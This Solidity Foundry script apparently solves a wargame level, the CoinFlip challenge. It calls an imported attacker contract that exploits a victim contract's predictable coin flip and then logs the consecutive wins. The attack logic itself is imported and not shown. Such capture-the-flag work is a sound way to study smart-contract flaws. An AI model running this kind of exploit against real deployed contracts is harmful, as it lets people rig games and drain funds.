// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Script, console} from "forge-std/Script.sol";
import {Attacker} from "../src/lv3-attacker.sol";

interface CoinFlip {
    function consecutiveWins() external view returns (uint256);
}

contract ExploitCoinFlip is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        address victimAddress = 0x3149708CA0dc85B7e0cD546AE16AF9426e78Bc4D;

        vm.startBroadcast(deployerPrivateKey);

        // Deploy attacker contract (Only do this ONCE)
        // Attacker attacker = new Attacker();
        // console.log("Attacker contract deployed at: %s", address(attacker));

        // Call the attack function on your deployed attacker contract
        // Replace with your attacker contract's address after deploying it
        Attacker attacker = Attacker(
            0xA1D96b022fB998Cf57B310738c4cBEF4c2D9c040
        );
        attacker.attack(victimAddress);
        console.log(
            "Consecutive Wins: %d",
            CoinFlip(victimAddress).consecutiveWins()
        );

        vm.stopBroadcast();
    }
}
